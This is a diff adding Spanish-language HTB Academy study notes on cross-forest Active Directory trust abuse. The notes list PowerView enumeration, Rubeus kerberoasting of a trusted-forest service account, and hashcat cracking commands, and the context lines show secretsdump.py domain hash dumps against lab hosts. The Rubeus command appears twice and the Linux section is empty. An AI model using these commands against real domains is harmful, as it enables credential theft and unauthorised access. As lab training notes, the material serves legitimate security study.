@@ -1952,4 +1952,41 @@ secretsdump.py -just-dc-ntlm LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc0
 ## Es mejor decirle que nos guarde todod como con el usuario admunn
 secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
 ```
+## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
+
+En resumen nos dice de se puede hacer kerberoasting si se tienen un dominio con trust forest bidireccional.
+
+```
+## Primero sacanos los usuarios del otro domino con SPN asociados
+
+Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+
+## Despues procedemos a sacar el hash
+
+Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
+
+## Conseguir el hash para crackearlo
+
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+
+## Hashcat
+
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+
+
+hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
+
+```
+
+![image](https://github.com/gecr07/HTB-Academy/assets/63270579/9ff805a4-aaa2-405a-9189-cd3cf82a302d)
+
+## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
+
+
+
+
+
+
+
+
 
